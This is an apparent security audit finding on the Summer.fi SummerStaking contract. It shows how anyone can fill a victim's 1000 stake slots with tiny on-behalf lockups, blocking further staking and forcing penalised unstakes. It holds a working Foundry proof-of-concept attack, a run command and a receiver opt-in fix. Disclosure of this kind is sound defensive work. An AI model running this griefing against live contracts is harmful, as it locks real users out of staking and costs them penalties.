# Attacker Can Exhaust Stake Slots Causing Victim Staking Denial

------------------------------------------------------------------------

## Summary

In `SummerStaking.sol`, the `_stakeLockup()` function appends new lockup
entries for any receiver without consolidation of identical lockups.
This will cause a denial of staking capability for affected users as an
attacker can repeatedly call `stakeLockupOnBehalf()` function to fill
all available stake slots of a victim. Once the maximum number of stakes
per portfolio is reached, legitimate stake attempts by the victim
revert. although the victim can revoke this revert by calling
`unstakeLockup` function but this will cause him an unnecessary penalty
(could be up to 20% if remaining is large), thus decreasing the user
interaction with the protocol.

------------------------------------------------------------------------

## Root Cause

In `SummerStaking.sol:129-137`, `stakeLockupOnBehalf()` function allows
any actor to create a lockup stake on behalf of any receiver without the
receiver's consent or opt-in.

The `_stakeLockup()` function at `SummerStaking.sol:471-537` appends a
new `UserStake` for every call with `_lockupPeriod > 0`, even if a stake
with the same lockup already exists.

``` solidity
function _stakeLockup(
    address _from,
    address _receiver,
    uint256 _amount,
    uint256 _lockupPeriod
) internal updateReward(_receiver) {
    if (_receiver == address(0))
        revert Staking_InvalidAddress("Target address cannot be zero");
    if (_from == address(0))
        revert Staking_InvalidAddress("Sender address cannot be zero");
    if (_amount == 0) revert Staking_InvalidAmount("Amount cannot be zero");
    if (_lockupPeriod > MAX_LOCKUP_PERIOD) {
        revert Staking_InvalidLockupPeriod("Lockup period cannot exceed 3 years");
    }

    if (stakesByOwner[_receiver].length >= MAX_AMOUNT_OF_STAKES) {
        revert Staking_MaxStakesReached();
    }

    if (_wouldExceedBucketCap(_lockupPeriod, _amount)) {
        revert Staking_BucketCapExceeded();
    }

    uint256 weightedAmount = _calculateWeightedStake(_amount, _lockupPeriod);
    UserStake[] storage _stakePortfolio = _ensurePortfolio(_receiver);

    uint256 _stakeIndex;
    if (_lockupPeriod == 0) {
        UserStake storage noLockupStake = _noLockupStake(_stakePortfolio);
        noLockupStake.amount += _amount;
        noLockupStake.weightedAmount += weightedAmount;
        noLockupStake.lockupEndTime = block.timestamp;
        _stakeIndex = NO_LOCKUP_INDEX;
    } else {
        _stakePortfolio.push(
            UserStake({
                amount: _amount,
                weightedAmount: weightedAmount,
                lockupEndTime: block.timestamp + _lockupPeriod,
                lockupPeriod: _lockupPeriod
            })
        );
        _stakeIndex = _stakePortfolio.length - 1;
    }

    _updateBalancesOnStake(_receiver, _amount, weightedAmount);
    _addToBucketTotal(_lockupPeriod, _amount);
    _handleTokenTransfersOnStake(_from, _receiver, _amount);

    emit Staked(_from, _receiver, _amount);
    emit StakedWithLockup(
        _receiver,
        _stakeIndex,
        _amount,
        _lockupPeriod,
        weightedAmount
    );
}
```

Each user portfolio has a hard limit `MAX_AMOUNT_OF_STAKES`
(`SummerStaking.sol:65`). Filling this limit blocks any further staking.

``` solidity
uint256 public constant MAX_AMOUNT_OF_STAKES = 1000;
```

Anyone can repeatedly create tiny-value lockups to consume all 1000
stake slots of a target receiver, effectively preventing them from
staking until the entries are cleared.

Affected Contract: `SummerStaking.sol`

------------------------------------------------------------------------

## Affected Lines of Code

-   https://github.com/sherlock-audit/2025-09-summer-fi-governance-v2/blob/main/summer-earn-protocol/packages/gov-contracts/src/contracts/SummerStaking.sol#L471C5-L537C1
-   https://github.com/sherlock-audit/2025-09-summer-fi-governance-v2/blob/main/summer-earn-protocol/packages/gov-contracts/src/contracts/SummerStaking.sol#L129C3-L136C1
-   https://github.com/sherlock-audit/2025-09-summer-fi-governance-v2/blob/main/summer-earn-protocol/packages/gov-contracts/src/contracts/SummerStaking.sol#L65

------------------------------------------------------------------------

## Internal Pre-conditions

-   Contract appends `UserStake` entries for `_lockupPeriod > 0` without
    merging identical lockups.
-   `stakeLockupOnBehalf()` callable by any actor for any `_receiver`.
-   Hard cap `MAX_AMOUNT_OF_STAKES` enforced before pushing new entries.

------------------------------------------------------------------------

## External Pre-conditions

-   No external layer prevents repeated small-value deposits.
-   Chain allows repeated transactions from attacker.
-   Gas prices not prohibitively high.

------------------------------------------------------------------------

## Attack Path

1.  Attacker obtains small `SUMR` balance and approves staking contract.
2.  Repeatedly call:

``` solidity
stakeLockupOnBehalf(victim, tiny_value, MAX_LOCKUP_PERIOD);
```

3.  Victim portfolio reaches `MAX_AMOUNT_OF_STAKES` entries.
4.  Victim attempts new stake → reverts with:

``` solidity
Staking_MaxStakesReached();
```

5.  Victim must `unstakeLockup()` each malicious entry.
6.  If long lockups chosen, victim either:
    -   Waits for expiry, or
    -   Unstakes early and pays penalty (up to 20%).

------------------------------------------------------------------------

## Example

-   `MAX_AMOUNT_OF_STAKES = 1000`
-   `MAX_LOCKUP_PERIOD = 3 * 365 days`
-   `amount = 1 wei (18 decimals)`

Attacker calls:

``` solidity
stakeLockupOnBehalf(victim, 1, MAX_LOCKUP_PERIOD);
```

Repeated until revert.

Attacker pays `1000 tokens (max)` + gas fees.

------------------------------------------------------------------------

## Impact

**Primary:** Victim cannot stake new tokens.

**Secondary:** Victim incurs gas + potential early-unstake penalties.

**Economic:** Token cost negligible if tiny values used; gas per call
\~150k--450k.

------------------------------------------------------------------------

## PoC

Create:

    packages/gov-contracts/test/staking/SummerStakingSlotFillPoC.t.sol

Paste:

``` solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {SummerStakingTestBase} from "./SummerStakingTestBase.sol";
import {ISummerStaking} from "../../src/interfaces/ISummerStaking.sol";
import "forge-std/Test.sol";

contract SummerStakingSlotFillPoC is SummerStakingTestBase, Test {

    address attacker = address(0xABCD);
    address victim = address(0xDEAD);

    uint256 public constant TINY_AMOUNT = 5;

    function setUp() public override {
        super.setUp();

        deal(address(aSummerToken), attacker, TINY_AMOUNT * 1000);
        deal(address(aSummerToken), victim, STAKE_AMOUNT);

        vm.startPrank(attacker);
        aSummerToken.approve(address(aStaking), TINY_AMOUNT * 1000);
        vm.stopPrank();
    }

    function test_slotFillGriefing() public {

        uint256 maxStakes = aStaking.MAX_AMOUNT_OF_STAKES();
        uint256 lockupPeriod = aStaking.MAX_LOCKUP_PERIOD();

        vm.startPrank(attacker);
        for (uint256 i = 0; i < maxStakes; i++) {
            aStaking.stakeLockupOnBehalf(victim, TINY_AMOUNT, lockupPeriod);
        }
        vm.stopPrank();

        uint256 victimStakes = aStaking.getUserStakesCount(victim);
        assertEq(victimStakes, maxStakes);

        vm.prank(attacker);
        vm.expectRevert();
        aStaking.stakeLockupOnBehalf(victim, TINY_AMOUNT, lockupPeriod);

        vm.startPrank(victim);
        vm.expectRevert();
        aStaking.stakeLockup(TINY_AMOUNT, lockupPeriod);
        vm.stopPrank();

        for (uint256 i = 0; i < maxStakes; i++) {
            vm.prank(victim);
            aStaking.unstakeLockup(i, TINY_AMOUNT);
        }

        assertEq(aStaking.getUserStakesCount(victim), 0);
    }
}
```

------------------------------------------------------------------------

### Test Execution

    forge test --mt test_slotFillGriefing -vvv

------------------------------------------------------------------------

## Mitigation

**Receiver opt-in:**

``` solidity
require(
    receiver == msg.sender || 
    allowStakeOnBehalf[receiver][msg.sender] == true
);
```

Implement `allowStakeOnBehalf` mapping with on-chain setter by receiver.

**Optional:** Per-operator cap limiting stakes per operator per
receiver.
